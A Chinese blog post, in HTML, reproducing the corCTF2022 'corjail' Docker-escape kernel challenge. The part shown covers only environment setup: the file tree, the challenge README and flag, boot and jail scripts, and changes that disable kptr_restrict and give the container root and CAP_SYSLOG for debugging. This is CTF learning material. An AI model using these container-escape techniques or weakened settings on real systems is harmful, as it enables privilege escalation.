

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="peiwithhao">
  <meta name="keywords" content="">
  
    <meta name="description" content="Players were asked to escape from a hardened Docker container with custom seccomp filters exploiting a Off-By-Null vulnerability in a Linux Kernel Module accessible via procfs. Let’s get started!">
<meta property="og:type" content="article">
<meta property="og:title" content="corCTF2022-corjail赛题复现">
<meta property="og:url" content="https://peiandhao.github.io/2024/01/08/corCTF2022-corjail/index.html">
<meta property="og:site_name" content="peiwithhao&#39;s Valhalla">
<meta property="og:description" content="Players were asked to escape from a hardened Docker container with custom seccomp filters exploiting a Off-By-Null vulnerability in a Linux Kernel Module accessible via procfs. Let’s get started!">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://peiandhao.github.io/img/corjail.jpg">
<meta property="article:published_time" content="2024-01-08T08:05:53.000Z">
<meta property="article:modified_time" content="2024-01-08T08:13:52.111Z">
<meta property="article:author" content="peiwithhao">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Kernel">
<meta property="article:tag" content="docker escape">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://peiandhao.github.io/img/corjail.jpg">
  
  
  
  <title>corCTF2022-corjail赛题复现 - peiwithhao&#39;s Valhalla</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"peiandhao.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"text"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","app_key":"Vr60qrZIptqhJaXqWvDEknkH","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>p3ivv1+h@0</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/corjail.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="corCTF2022-corjail赛题复现"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        peiwithhao
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-01-08 16:05" pubdate>
          2024年1月8日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          43k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          359 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">corCTF2022-corjail赛题复现</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="corCTF2022-corjail"><a href="#corCTF2022-corjail" class="headerlink" title="corCTF2022-corjail"></a>corCTF2022-corjail</h1><p>出题人D3V17关于本题的文章在<a target="_blank" rel="noopener" href="https://syst3mfailure.io/corjail/">这里</a></p>
<p>由于这是本人第一次写有关于Linux kernel+Docker escape的题型，所以下面会尽可能详细的写下解题步骤</p>
<p>首先是给出第一次启动的图，十分的炫酷捏</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8326cffc1e178a82f6fd2794b003738da877e8c5.jpg" srcset="/img/loading.gif" lazyload></p>
<h1 id="0x00-题目结构分析"><a href="#0x00-题目结构分析" class="headerlink" title="0x00 题目结构分析"></a>0x00 题目结构分析</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs stylus">./<br>├── README<span class="hljs-selector-class">.md</span><br>└── task<br>    ├── build<br>    │   ├── build_image<span class="hljs-selector-class">.sh</span><br>    │   ├── build_kernel<span class="hljs-selector-class">.sh</span><br>    │   ├── coros<br>    │   │   └── files<br>    │   │       ├── bin<br>    │   │       │   ├── init<br>    │   │       │   └── jail<br>    │   │       ├── config<br>    │   │       │   ├── init<span class="hljs-selector-class">.service</span><br>    │   │       │   ├── motd<br>    │   │       │   └── serial-getty@<span class="hljs-selector-class">.service</span><br>    │   │       ├── docker<br>    │   │       │   ├── Dockerfile<br>    │   │       │   ├── image<br>    │   │       │   │   └── image<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span><br>    │   │       │   └── seccomp<span class="hljs-selector-class">.json</span><br>    │   │       ├── flag<span class="hljs-selector-class">.txt</span><br>    │   │       └── module<br>    │   │           ├── cormon<span class="hljs-selector-class">.ko</span><br>    │   │           ├── modules<span class="hljs-selector-class">.dep</span><br>    │   │           └── modules<span class="hljs-selector-class">.dep</span><span class="hljs-selector-class">.bin</span><br>    │   └── kernel<br>    │       └── patch<br>    ├── chall<br>    │   ├── bzImage<br>    │   ├── cormon<span class="hljs-selector-class">.ko</span><br>    │   ├── run_challenge<span class="hljs-selector-class">.sh</span><br>    │   └── seccomp<span class="hljs-selector-class">.json</span><br>    └── flag-license-website<br>        ├── app<br>        │   ├── app<span class="hljs-selector-class">.py</span><br>        │   ├── encryption<span class="hljs-selector-class">.py</span><br>        │   ├── requirements<span class="hljs-selector-class">.txt</span><br>        │   ├── static<br>        │   │   ├── css<br>        │   │   │   ├── <span class="hljs-number">1</span>d2e0db7bdadca0cdc47367126aadc25<span class="hljs-selector-class">.css</span><br>        │   │   │   ├── <span class="hljs-number">20</span>cc687b2730725b9aac594e2a77819c<span class="hljs-selector-class">.css</span><br>        │   │   │   └── <span class="hljs-number">38</span>ec85f45423ec52e9d1f2f778e847ed<span class="hljs-selector-class">.css</span><br>        │   │   ├── images<br>        │   │   │   ├── <span class="hljs-number">639</span>ea56cc818bb6c6388719b4bdd1c7a<span class="hljs-selector-class">.png</span><br>        │   │   │   ├── <span class="hljs-number">7</span>c6877ac5a9ca7acdcde196ed91c6799<span class="hljs-selector-class">.png</span><br>        │   │   │   ├── bb5851739df3c7426a0686449cb04974<span class="hljs-selector-class">.png</span><br>        │   │   │   ├── d4275f26e6700049f85155adda41c9a1<span class="hljs-selector-class">.jpg</span><br>        │   │   │   └── favicon<span class="hljs-selector-class">.ico</span><br>        │   │   └── js<br>        │   │       └── efbd3bc838f31c807a42211a4bce2cd2<span class="hljs-selector-class">.js</span><br>        │   └── templates<br>        │       ├── index<span class="hljs-selector-class">.html</span><br>        │       ├── result<span class="hljs-selector-class">.html</span><br>        │       └── unlock<span class="hljs-selector-class">.html</span><br>        ├── docker-compose<span class="hljs-selector-class">.yml</span><br>        └── Dockerfile<br><br><span class="hljs-number">18</span> directories, <span class="hljs-number">38</span> files<br><br></code></pre></td></tr></table></figure>

<p>可以看到文件结构还是十分的复杂，首先我们所要做的事情就是听人劝吃饱饭，先读读 <code>README.md</code></p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Solves: <span class="hljs-number">1</span><br><br>Author: D3v17<br><br>Description:<br><br>Containerized environments are <span class="hljs-literal">no</span> longer a safe place.<br>Evil hackers <span class="hljs-keyword">continue</span> <span class="hljs-keyword">to</span> refine their secret techniques <span class="hljs-keyword">to</span> bypass modern kernel protectons.<br>CoRJail, <span class="hljs-keyword">as</span> part <span class="hljs-keyword">of</span> CoROS, <span class="hljs-keyword">is</span> designed <span class="hljs-keyword">to</span> stop them!<br><br>With CoRJail, several dangerous syscalls, like msgsnd/msgrcv, are blocked <span class="hljs-keyword">by</span> custom seccomp filters.<br>Syscall usage <span class="hljs-keyword">is</span> constantly monitored <span class="hljs-keyword">with</span> CoRMon, so <span class="hljs-literal">that</span> kernel exploit patterns can rapidly be detected.<br><br>Try the <span class="hljs-keyword">default</span> CoRMon filter <span class="hljs-keyword">with</span> `cat /proc_rw/cormon` <span class="hljs-keyword">and</span> monitor syscall usage like a boss!<br>Still <span class="hljs-keyword">not</span> satisfied? <span class="hljs-built_in">Set</span> a custom filter <span class="hljs-keyword">with</span> `echo -n <span class="hljs-string">&#x27;sys_msgsnd,sys_msgrcv&#x27;</span> &gt; /proc_rw/cormon`.<br><br>Wanna access all the other CoROS features? Buy a CoR SaaS License <span class="hljs-keyword">for</span> only $<span class="hljs-number">31337.00</span>/mo!<br>Hackers<span class="hljs-string">&#x27; days are numbered!</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Flag: `corctf&#123;C0R_J4!L_H@S_B33N_PWN3D_991cd43a402cda6c&#125;`</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>

<p>出题者 <code>D3v17</code>跟 <code>BitsByWill</code>师傅好像经常成对在corctf贡献例题，tql</p>
<p>话说回来，上面这段话给了我们的信息是可以通过 <code>echo -n &#39;sys_msgsnd,sys_msgrcv&#39; &gt; /proc_rw/cormo</code>来修改我们的 <code>Cormon filter</code>,该过滤器检测了我们使用系统调用的一些简单信息，这在之后我们再来讨论，先说会题目环境的问题</p>
<p>由于本人在docker领域仍是一个新的不能再新手，所以在看到题目给出的文件结构是十分难绷的</p>
<p><img src="https://th.bing.com/th/id/OIP.RtOJYZkiuJYKODOPHRjvnAHaEo?pid=ImgDet&w=1005&h=628&rs=1" srcset="/img/loading.gif" lazyload></p>
<p>扭头可以看到唯一十分熟悉的是 <code>chall/</code>目录下的文件，这里第一时间查看他的 <code>run_challenge.sh</code></p>
<p>如下：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#!/bin/sh</span><br>qemu-system-x86_64 <span class="hljs-string">\</span><br>    -m <span class="hljs-number">1</span>G <span class="hljs-string">\</span><br>    -nographic <span class="hljs-string">\</span><br>    -<span class="hljs-literal">no</span>-reboot <span class="hljs-string">\</span><br>    -kernel bzImage <span class="hljs-string">\</span><br>    -append <span class="hljs-string">&quot;console=ttyS0 root=/dev/sda quiet loglevel=3 rd.systemd.show_status=auto rd.udev.log_level=3 oops=panic panic=-1 net.ifnames=0 pti=on&quot;</span> <span class="hljs-string">\</span><br>    -hda coros.qcow2 <span class="hljs-string">\</span><br>    -snapshot <span class="hljs-string">\</span><br>    -monitor /dev/<span class="hljs-literal">null</span> <span class="hljs-string">\</span><br>    -cpu qemu64,+smep,+smap,+rdrand <span class="hljs-string">\</span><br>    -smp cores=<span class="hljs-number">4</span> <span class="hljs-string">\</span><br>    --enable-kvm<br><br></code></pre></td></tr></table></figure>

<p>可以看到其中也是使用到了一个拷在硬盘上的文件系统 <code>coros.qcow2</code>，在出题人的github上也说明由于过于庞大所以我们需要自己使用 <code>build/build_image.sh</code>来进行构建，</p>
<p>同样的我们在 <code>build</code>文件目录下也看到了一个 <code>build_kernel.sh</code>的脚本，可以使用他来编译内核，但在编译的过程当中可能会出现SSL报错问题，并且由于是单核编译所以慢的不能再慢，因此这里给出的解决办法是将编译选项 <code>MODULE_SIG_ALL</code>取消选择即可。</p>
<p>要查询给定硬盘上的文件系统，我们需要首先将其挂载再我们的某个硬盘设备下，这里给出挂载&#x2F;卸载脚本</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">### mount.bash</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">set</span> -eu<br><br><span class="hljs-attribute">MNTPOINT</span>=/tmp/hoge<br><span class="hljs-attribute">QCOW</span>=$(realpath <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;PWD&#125;</span>&quot;</span>/<span class="hljs-built_in">..</span>/build/coros/coros.qcow2)<br><br>sudo modprobe nbd <span class="hljs-attribute">max_part</span>=8<br>mkdir -p <span class="hljs-variable">$MNTPOINT</span><br>sudo qemu-nbd <span class="hljs-attribute">--connect</span>=/dev/nbd0 <span class="hljs-string">&quot;<span class="hljs-variable">$QCOW</span>&quot;</span><br>sudo fdisk -l /dev/nbd0<br>sudo mount /dev/nbd0 <span class="hljs-variable">$MNTPOINT</span><br><br><span class="hljs-comment">### umount.bash</span><br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">set</span> -eu<br><span class="hljs-attribute">MNTPOINT</span>=/tmp/hoge<br><br>sudo umount <span class="hljs-variable">$MNTPOINT</span> || <span class="hljs-literal">true</span><br>sudo qemu-nbd --disconnect /dev/nbd0<br>sudo rmmod nbd<br></code></pre></td></tr></table></figure>

<p>我们在挂载的文件系统当中查看 <code>etc/inittab</code>文件，该文件内进行了运行级别的配置</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">T0:</span><span class="hljs-number">23</span><span class="hljs-symbol">:respawn</span><span class="hljs-symbol">:/sbin/getty</span> -L ttyS0 <span class="hljs-number">115200</span> vt100<br></code></pre></td></tr></table></figure>

<p>然后通过 <code>/etc/systemd/system/init.service</code>来查看 服务进程</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Initialize challenge<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=<span class="hljs-literal">on</span>eshot<br><span class="hljs-attr">ExecStart</span>=/usr/local/bin/init<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure>

<p>然后我们来看其中的服务条目，查看 <code>ExecStart</code>所对应的 <code>/usr/local/bin/init</code>脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>USER=user<br><br>FLAG=$(<span class="hljs-built_in">head</span> -n 100 /dev/urandom | <span class="hljs-built_in">sha512sum</span> | awk <span class="hljs-string">&#x27;&#123;printf $1&#125;&#x27;</span>)<br><br>useradd --create-home --shell /bin/bash <span class="hljs-variable">$USER</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PS1=&#x27;\[\033[01;31m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# &#x27;&quot;</span>  &gt;&gt; /root/.bashrc<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PS1=&#x27;\[\033[01;35m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;&quot;</span> &gt;&gt; /home/<span class="hljs-variable">$USER</span>/.bashrc<br><br><span class="hljs-built_in">chmod</span> -r 0700 /home/<span class="hljs-variable">$USER</span><br><br><span class="hljs-built_in">mv</span> /root/temp /root/<span class="hljs-variable">$FLAG</span><br><span class="hljs-built_in">chmod</span> 0400 /root/<span class="hljs-variable">$FLAG</span><br></code></pre></td></tr></table></figure>

<p>其中大概含义是首先创建一个名叫user的普通用户，然后给了我们一个好看的shell提示符:)，之后将flag设置为root权限，在这之后我们查看 <code>etc/passwd</code></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/usr/local/bin/jail</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>.......<br></code></pre></td></tr></table></figure>

<p>我们再进一步查看root用户的shell <code>usr/local/bin/jail</code>,如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#x27;</span><br>/usr/bin/docker run -it --user user --hostname CoRJail --security-opt seccomp=/etc/docker/corjail.json -v /proc/cormon:/proc_rw/cormon:rw corcontainer<br>/usr/sbin/poweroff -f<br><br></code></pre></td></tr></table></figure>

<p>这里最终发现整体结构是启动了root的 shell后是首先调用 <code>docker</code>来构建了一个容器然后关闭自身，在那之后我们起的虚拟环境就是处于该docker容器当中，这一点搞懂了十分舒畅 :^)</p>
<p>因此这里我们可以直接修改其中要素，将上面的文件修改为</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#!<span class="hljs-regexp">/bin/</span>bash<br><br>echo -e <span class="hljs-string">&#x27;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#x27;</span><br>#<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/docker run -itd --user user --hostname CoRJail --security-opt seccomp=/</span>etc<span class="hljs-regexp">/docker/</span>corjail.json -v <span class="hljs-regexp">/proc/</span>cormon:<span class="hljs-regexp">/proc_rw/</span>cormon:rw corcontainer<br><span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-regexp">/usr/</span>sbin/poweroff -f<br></code></pre></td></tr></table></figure>

<p>这样我们就可以将docker容器在后台运行然后得到一个 <strong>真正的本地root权限shell，而并非在docker当中</strong>，在其中我们使用 <code>docker images</code>来查看docker镜像情况</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/9345d688d43f8794b8c7131a941b0ef41bd53acd.jpg" srcset="/img/loading.gif" lazyload></p>
<p>我们发现其中有两个容器镜像是在 <code>usr/local/bin/jail</code>之前就已经存在,那么他们是从哪儿来的呢，我们查看 <code>build_image.sh</code>文件，也就是我们获取该文件系统镜像的脚本，其中有一部分如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs build_image.sh"># Copy docker image<br>tar -xzvf coros/files/docker/image/image.tar.gz -C coros/files/docker<br>cp -rp coros/files/docker/var/lib/docker $FS/var/lib/<br>rm -rf coros/files/docker/var                                            <br></code></pre></td></tr></table></figure>

<p>这里为了方便我们之后漏洞调试的工作，所以我们此时将其启动脚本修改为如下部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs usr/local/bin/jail">#!/bin/bash<br><br>echo -e &#x27;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#x27;<br>cp /exploit /home/user || echo &quot;[!] exploit not found, skipping&quot;<br>chown -R user:user /home/user<br>echo 0 &gt; /proc/sys/kernel/kptr_restrict<br>/usr/bin/docker run -it --user root \<br>  --hostname CoRJail \<br>  --security-opt seccomp=/etc/docker/corjail.json \<br>  --add-cap CAP_SYSLOG \<br>  -v /proc/cormon:/proc_rw/cormon:rw \<br>  -v /home/user/:/home/user/host \<br>  corcontainer<br>/usr/sbin/poweroff -f<br></code></pre></td></tr></table></figure>

<p>下面按照行号来讲解</p>
<p>第四行，在我们挂载的文件系统当中创建的 <code>exploit</code>文件复制到 <code>home/user</code>文件目录下</p>
<p>第五行，修改该目录下的用户以及用户组所有权(</p>
<p>第六行，这里普及一下相关知识，这里主要是查看proc文件的官方手册</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">The value in this file determines whether kernel addresses are exposed via /proc files and other interfaces.   A  value  of  0  in  this file imposes no restrictions.  If the value is 1, kernel pointers printed using the %pK format specifier will be replaced with zeros unless the user  has the  CAP_SYSLOG  capability.   If  the  value is 2, kernel pointers printed using the %pK format specifier will be replaced with zeros regardless of the user&#x27;s capabilities.   The  initial  default  value for this file was 1, but the default was changed to 0 in Linux 2.6.39.  Since Linux 3.4, only users with the CAP_SYS_ADMIN capability can change the value in this file.<br></code></pre></td></tr></table></figure>

<p>这里不放中文是有可能翻译过来损失了原本的含义，所以这里仅给出原文和个人的见解</p>
<p>如果该值为0，则不产生任何影响，如果该值为1，则使用 <code>%pK</code>格式化打印的内核指针将会替换为0，在这种情况下用户也可以将所属用户空间的标志位设置有 <code>CAP_SYSLOG</code>来进行绕过。而如果该值为2，则即使用户设置了 <code>CAP_SYSLOG</code>也会将内核指针地址置0.</p>
<p>第七行，为该容器添加 <code>CAP_SYSLOG</code>用户空间标志</p>
<p>第十一行，十二行，从根文件系统绑定用户目录到docker容器</p>
<p>在这之后我们就可以方便的以root来查看我们的符号表，如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c8701f8c7f3d2617f9e2f0708ff95.jpg" srcset="/img/loading.gif" lazyload></p>
